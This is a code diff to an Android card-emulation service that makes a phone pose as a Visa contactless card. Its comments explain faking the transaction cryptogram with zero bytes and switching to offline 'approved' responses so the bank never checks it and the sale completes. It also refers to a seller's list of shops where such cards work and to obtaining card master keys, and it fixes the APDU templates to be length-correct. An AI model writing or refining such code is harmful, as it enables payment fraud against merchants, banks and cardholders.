@@ -54,16 +54,22 @@ public class HceCcEmulationServiceVisa extends HostApduService {
 
     /**
      * true  - answer ARQC on the first cryptogram request, so the terminal goes
-     *         online. The host receives the PAN, does not recognise the card,
-     *         and declines - and a decline is the one outcome that reliably
-     *         prints a slip carrying the PAN.
+     *         online. The bank then recomputes the cryptogram and compares it
+     *         with ours. Ours is eight zero bytes, so the check fails and the
+     *         outcome depends on how lenient that particular issuer feels - which
+     *         is exactly what a seller's "works at TJ Maxx" list records.
      *
-     *         An offline TC approve usually prints nothing, which is why this is
-     *         the setting to use when you want a receipt.
+     * false - answer TC instead. The card says "approved, do not call the host",
+     *         so neither the bank nor the host ever judges the cryptogram. Works
+     *         wherever the terminal reads the card, not just at whichever shops
+     *         happen to be lenient - and because the sale completes, a receipt
+     *         actually prints.
      *
-     * false - the logic below: ARQC when we hold a genuine key, TC otherwise.
+     *         Use false to prove the terminal walks the card at all. Flip to true
+     *         once that is proven and you want the realistic online path, or once
+     *         you hold a genuine MK-AC and the ARQC is real.
      */
-    private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = true;
+    private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = false;
 
     /**
      * true  - when we actually hold a matching MK-AC, answer ARQC and let the
@@ -104,11 +110,15 @@ public class HceCcEmulationServiceVisa extends HostApduService {
      *   match    - hex PREFIX of the command APDU. 80A80000 catches every GPO.
      *   response - sent verbatim, so paste the '<<' line out of the tap log.
      * '#' starts a comment, spaces are ignored, longest match wins.
+     *
+     * Both examples below are length-correct. A 77 template must declare its
+     * content length exactly - 82 02 xxxx is 4 bytes and 94 08 + 8 is 10, so the
+     * content is 14 = 0x0E and the header reads 770E.
      */
     private static final String DEFAULT_SCRIPT =
             "# match=response, hex only. Longest match wins.\n"
-          + "# 80A80000=773C8202180094080801010010010300 9000\n"
-          + "# 00B2010C=700A5A086011499432007704 9000\n";
+          + "# 80A80000=770E8202180094080801010010010300 9000\n"
+          + "# 00B2010C=70265A0860114994320077045F24033112318C149F02069F03069F1A0295055F2A029A039C019F3704 9000\n";
 
     private final StringBuilder tapLog = new StringBuilder();
     private final Random rnd = new Random();
